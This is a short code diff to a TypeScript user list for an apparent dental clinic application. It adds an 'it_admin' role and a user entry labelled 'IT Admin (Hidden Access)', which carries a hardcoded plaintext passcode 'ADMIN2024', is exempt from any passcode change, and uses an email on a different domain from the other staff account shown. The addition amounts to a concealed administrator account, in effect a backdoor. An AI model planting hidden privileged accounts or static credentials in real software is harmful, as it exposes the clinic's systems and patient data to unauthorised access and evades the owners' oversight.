@@ -1,4 +1,4 @@
-export type UserRole = "admin" | "dentist" | "staff" | "receptionist" | "front_desk";
+export type UserRole = "admin" | "dentist" | "staff" | "receptionist" | "front_desk" | "it_admin";
 
 export interface User {
   employeeId: string;
@@ -174,6 +174,18 @@ export const users: User[] = [
     email: "frontdesk@kreativdental.com",
     mustChangePasscode: false,
     passcodeSetDate: "2025-10-15",
+  },
+
+  // IT Admin (Hidden Access)
+  {
+    employeeId: "IT001",
+    name: "System Administrator",
+    role: "it_admin",
+    passcode: "ADMIN2024",
+    position: "IT Systems Manager",
+    email: "it.admin@kreativdentalplus.com",
+    mustChangePasscode: false,
+    passcodeSetDate: "2024-01-01",
   },
 ];
 
